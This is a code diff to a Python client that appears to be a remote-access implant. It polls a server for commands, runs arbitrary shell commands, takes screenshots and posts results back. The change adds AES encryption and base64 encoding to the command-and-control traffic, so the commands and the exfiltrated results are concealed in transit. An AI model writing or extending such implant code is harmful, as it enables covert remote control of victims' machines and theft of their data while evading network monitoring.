@@ -8,6 +8,7 @@ import mss
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 from Crypto.Random import get_random_bytes
+import base64
 
 # Track the current working directory (starting with the root or default directory)
 current_directory = os.path.expanduser("~")
@@ -320,7 +321,21 @@ while True:
         
         # Check if the response status is OK
         if response.status_code == 200:
-            command = response.json().get("command")
+            # Decode the Base64 response text
+            decoded_data = base64.b64decode(response.text).decode('utf-8')
+
+            # Convert the decoded string back to a dictionary
+            data = json.loads(decoded_data)
+
+            # Extract the nonce, ciphertext, and tag
+            nonce_hex = data["nonce"]
+            ciphertext_hex = data["ciphertext"]
+            tag_hex = data["tag"]
+
+            # Call decrypt_data function with aes_key and the extracted values
+            decrypted_text = decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex).decode("utf-8")
+            command_in_json = (json.loads(decrypted_text.replace("'", '"')))
+            command = command_in_json.get("command")
             print(command)  # for logging, remove later
             if command == "screenshot":
                 with mss.mss() as sct:
@@ -404,11 +419,16 @@ while True:
                 pass
             elif command.strip == "change_key":
                 pass
-            else:    
-                result = execute_command(command)
+            else:
                 
-                # Send the result back to the server
-                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client", json={"command":command, "result": result, "client_id":client_id}, verify='cert.pem')
+                result = {"command":command, "result": execute_command(command), "client_id":client_id}
+                print(result)
+                encrypted_result_dictionary = encrypt_data(aes_key,f"{result}")
+                encrypted_result_dictionary = json.dumps(encrypted_result_dictionary)
+                # Encode the JSON string in Base64
+                encrypted_and_b64_encoded_result = base64.b64encode(encrypted_result_dictionary.encode('utf-8')).decode('utf-8')
+                print(encrypted_and_b64_encoded_result)
+                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client?clientID={client_id}", data=encrypted_and_b64_encoded_result, verify='cert.pem')
                 
                 # Check if the result was successfully sent
                 if result_response.status_code != 200:
